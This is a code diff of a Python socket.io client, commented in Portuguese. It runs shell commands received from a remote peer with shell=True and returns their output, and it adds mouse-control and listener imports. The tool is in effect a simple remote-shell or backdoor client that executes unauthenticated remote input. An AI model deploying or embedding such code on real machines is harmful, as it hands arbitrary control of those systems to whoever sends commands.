@@ -1,6 +1,9 @@
 import socketio
 import os
 import subprocess
+import ctypes
+from pynput.mouse import Controller, Listener
+import threading
 
 
 # Conectando ao servidor
@@ -22,19 +25,24 @@ def on_message(data):
 def on_execute_command(data):
     print(f"Comando recebido de {data['from']}: {data['command']}")
     try:
+ # Executa o comando no terminal
         process = subprocess.Popen(
             data['command'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
         )
         output, error = process.communicate()
-
-        output = os.popen(data['command']).read()
         
-        print(f"Saída do comando:\n{output}")
-        socketClient.emit('send_message', {'target': data['from'], 'message': output})
+
+        if output:
+            print(f"Saída do comando:\n{output}")
+            socketClient.emit('send_message', {'target': data['from'], 'message': f"Saída:\n{output}"})
+        if error:
+            print(f"Erro ao executar o comando:\n{error}")
+
     except Exception as exception:
         print(f"Erro ao executar o comando: {exception}")
 
 def main():
+
     socketClient.connect('http://localhost:3000')
 
     # await 
